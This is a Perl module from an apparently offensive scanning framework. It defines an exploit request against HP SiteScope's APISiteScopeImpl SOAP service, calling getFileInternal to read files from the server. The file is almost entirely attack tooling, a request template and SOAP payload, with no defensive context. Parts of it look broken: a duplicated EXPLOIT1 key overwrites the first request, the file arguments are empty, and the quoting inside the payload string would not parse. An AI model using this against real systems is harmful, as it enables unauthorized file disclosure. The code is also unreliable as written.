ExploitsMSF/HP/MSF/HpSitescopeGetfileinternalFileaccess.pm

package P1rK3r::Exploits::HP::MSF::HpSitescopeGetfileinternalFileaccess;
use parent qw(P1rK3r::Exploit P1rK3r::Services::HP);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

use P1rK3r::Functions::Basic;
use P1rK3r::Functions::Errors;
use P1rK3r::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "HpSitescopeGetfileinternalFileaccess";

   my $DETECTION = {

   };

   my $EXPLOIT = {
        TYPE => 'MSF',
        PLATFORM => 'SCANNER',
        REQUESTS => {
                EXPLOIT1 => {
                        METHOD       => 'GET',
                        PATH         => '',
                        PAYLOAD      => '',
                        TEXT         => 'Sending Exploit #1 Request : [GET] ',
                        HEADERS      => {
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
                EXPLOIT1 => {
                        METHOD       => 'POST',
                        PATH         => 'services/APISiteScopeImpl',
                        PAYLOAD      => '<?xml version='1.0' encoding='UTF-8'?>
<wsns0:Envelope
xmlns:wsns1='http://www.w3.org/2001/XMLSchema-instance'
xmlns:xsd='http://www.w3.org/2001/XMLSchema'
xmlns:wsns0='http://schemas.xmlsoap.org/soap/envelope/'
>
<wsns0:Body
wsns0:encodingStyle='http://schemas.xmlsoap.org/soap/encoding/'
>
<impl:getFileInternal
xmlns:impl='http://Api.freshtech.COM'
>
<in0
xsi:nil='true'
xsi:type='xsd:string'
xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'
></in0>
<in1
xsi:nil='true'
xsi:type='xsd:string'
xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'
></in1>
</impl:getFileInternal>
</wsns0:Body>
</wsns0:Envelope>',
                        TEXT         => 'Sending Exploit #1 Request : [POST] /services/APISiteScopeImpl',
                        HEADERS      => {
                           'SOAPAction' => '""',
                           'Content-Type' => 'text/xml; charset=UTF-8',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
        },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
